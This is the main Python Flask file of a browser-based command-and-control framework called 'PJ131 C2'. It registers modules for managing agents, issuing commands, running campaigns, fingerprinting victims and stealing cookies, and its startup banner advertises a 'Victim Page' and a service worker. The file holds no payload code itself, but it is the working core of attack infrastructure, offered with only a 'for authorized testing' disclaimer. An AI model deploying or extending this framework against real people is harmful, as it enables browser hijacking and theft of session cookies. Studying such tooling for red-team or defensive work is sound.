"""
PJ131 C2 - Browser-based Command & Control Server
"""
from flask import Flask
from flask_cors import CORS
from models import db
from routes import (
    main_bp,
    agents_bp,
    commands_bp,
    campaigns_bp,
    stats_bp
)

import os

from utils.vapid import init_vapid_keys
from utils.vapid import init_vapid_keys
init_vapid_keys()

from features.fingerprint import fingerprint_bp
from features.cookie_stealer import cookie_stealer_bp

def create_app():
    """Application factory"""
    app = Flask(__name__)
    
    # Get absolute path to project directory
    basedir = os.path.abspath(os.path.dirname(__file__))
    
    # Create instance folder if it doesn't exist
    instance_path = os.path.join(basedir, 'instance')
    if not os.path.exists(instance_path):
        os.makedirs(instance_path)
        print(f"[+] Created instance folder: {instance_path}")
    
    # Database path
    db_path = os.path.join(instance_path, 'browserc2.db')
    
    # Configuration
    app.config['SECRET_KEY'] = os.urandom(24)
    app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{db_path}'
    app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
    
    print(f"[+] Database path: {db_path}")
    
    # Enable CORS for all routes
    CORS(app)
    
    # Initialize database
    db.init_app(app)
    
    # Create tables
    with app.app_context():
        db.create_all()
        print("[+] Database tables created")
    
    # Register blueprints
    app.register_blueprint(main_bp)
    app.register_blueprint(agents_bp, url_prefix='/api')
    app.register_blueprint(commands_bp, url_prefix='/api')
    app.register_blueprint(campaigns_bp, url_prefix='/api')
    app.register_blueprint(stats_bp, url_prefix='/api')
    app.register_blueprint(fingerprint_bp, url_prefix='/api')
    app.register_blueprint(cookie_stealer_bp, url_prefix='/api')
    
    return app

if __name__ == '__main__':
    # Only show startup message once (not on reloader)
    import sys
    if os.environ.get('WERKZEUG_RUN_MAIN') != 'true':
        print("\n")
        print("\033[91m" + """
██████╗      ██╗ ██╗██████╗  ██╗    ░█████╗░██████╗░
██╔══██╗     ██║███║╚════██╗███║    ██╔══██╗╚════██╗
██████╔╝     ██║╚██║ █████╔╝╚██║    ██║  ╚═╝ █████╔╝
██╔═══╝ ██   ██║ ██║ ╚═══██╗ ██║    ██║  ██╗██╔═══╝ 
██║     ╚█████╔╝ ██║██████╔╝ ██║    ╚█████╔╝███████╗
╚═╝      ╚════╝  ╚═╝╚═════╝  ╚═╝     ╚════╝ ╚══════╝
        """ + "\033[0m")
        print("\033[96m" + "=" * 65 + "\033[0m")
        print("  \033[93m🎯 Browser-Based Command & Control Framework\033[0m")
        print("  \033[91m💀 For Educational & Authorized Testing Only\033[0m")
        print("  \033[90m   Created by: Hackin' with PJ131\033[0m")
        print("\033[96m" + "=" * 65 + "\033[0m")
        print(f"  \033[92m📊 C2 Dashboard\033[0m    : \033[94mhttps://localhost:5000/c2\033[0m")
        print(f"  \033[93m🎣 Victim Page\033[0m     : \033[94mhttps://localhost:5000/\033[0m")
        print(f"  \033[95m⚙️  Service Worker\033[0m  : \033[94mhttps://localhost:5000/sw.js\033[0m")
        print("\033[96m" + "=" * 65 + "\033[0m")
        print("  \033[92m[✓]\033[0m VAPID keys loaded")
        print("  \033[92m[✓]\033[0m Database initialized")
        print("  \033[92m[✓]\033[0m Server starting...")
        print("\033[96m" + "=" * 65 + "\033[0m")
        print("  \033[93m⚠️  Press CTRL+C to stop the server\033[0m")
        print("\033[96m" + "=" * 65 + "\033[0m")
        print("\n")
    
    app = create_app()
    
    # Run with minimal output
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)  # Only show errors
    
    app.run(
        host='0.0.0.0',
        port=5000,
        debug=True,
        ssl_context=('cert.pem', 'key.pem'),
        use_reloader=True
    )
